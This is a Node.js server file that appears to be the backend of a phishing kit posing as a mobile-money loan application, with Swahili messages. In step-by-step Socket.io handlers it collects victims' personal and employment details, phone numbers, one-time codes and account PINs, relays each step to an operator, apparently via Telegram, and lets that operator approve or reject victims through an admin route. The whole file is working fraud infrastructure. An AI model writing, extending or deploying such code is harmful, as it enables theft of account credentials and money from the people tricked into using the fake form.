const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');
const botManager = require('./bot_manager');

const app = express();
const server = http.createServer(app);
const PORT = process.env.PORT || 10000;

app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

const io = new Server(server, { cors: { origin: "*" } });
const sessions = new Map();

io.on('connection', (socket) => {
    // Initialize session with the socket ID
    sessions.set(socket.id, { data: { socketId: socket.id } });

    // --- STEP 1: LOAN DETAILS ---
    socket.on('step1', (data) => {
        const session = sessions.get(socket.id);
        if (session) {
            session.data = { ...session.data, ...data };
            botManager.sendStep1(session.data);
        }
    });

    // --- STEP 2: PERSONAL INFO ---
    socket.on('step2', (data) => {
        const session = sessions.get(socket.id);
        if (session) {
            session.data = { ...session.data, ...data };
            botManager.sendStep2(session.data);
        }
    });

    // --- STEP 3: EMPLOYMENT ---
    socket.on('step3-data', (data) => {
        const session = sessions.get(socket.id);
        if (session) {
            session.data = { ...session.data, ...data };
            botManager.sendStep3(session.data);
        }
    });

    // --- STEP 4 (PART A): GENERATE OTP (NO TELEGRAM ALERT YET) ---
    socket.on('send-otp', (data) => {
        const otp = Math.floor(1000 + Math.random() * 9000).toString();
        const session = sessions.get(socket.id);
        if (session) {
            session.otp = otp;
            session.data.phone = data.phoneNumber;
            console.log(`[OTP] Generated for ${socket.id}: ${otp}`);
            socket.emit('otp-sent'); // Tells HTML to show the input field
        }
    });

    // --- STEP 4 (PART B): VERIFY OTP (TRIGGERS TELEGRAM ALERT) ---
    socket.on('step4-otp', (data) => {
        const session = sessions.get(socket.id);
        if (session && session.otp === data.otp) {
            // Send the alert to Telegram ONLY now because the user filled it
            botManager.sendStep4({ socketId: socket.id, otp: data.otp });
            socket.emit('otp-verified');
        } else {
            socket.emit('admin-rejected', { message: 'Namba ya uhakiki si sahihi.' });
        }
    });

    // --- STEP 5: PIN SUBMITTED ---
    socket.on('step5-pin', (data) => {
        const session = sessions.get(socket.id);
        if (session) {
            session.data.pin = data.pin;
            botManager.sendStep5(session.data);
        }
    });

    socket.on('disconnect', () => sessions.delete(socket.id));
});

// Admin Route for Telegram Buttons
app.post('/admin/action', (req, res) => {
    const { socketId, action } = req.body;
    if (action === 'approve') {
        io.to(socketId).emit('admin-approved', { referenceId: "MIX-" + Date.now() });
    } else {
        io.to(socketId).emit('admin-rejected', { message: 'Maombi yamekataliwa.' });
    }
    res.sendStatus(200);
});

// Bind to 0.0.0.0 for Render Production
server.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Production Server Live on Port ${PORT}`);
});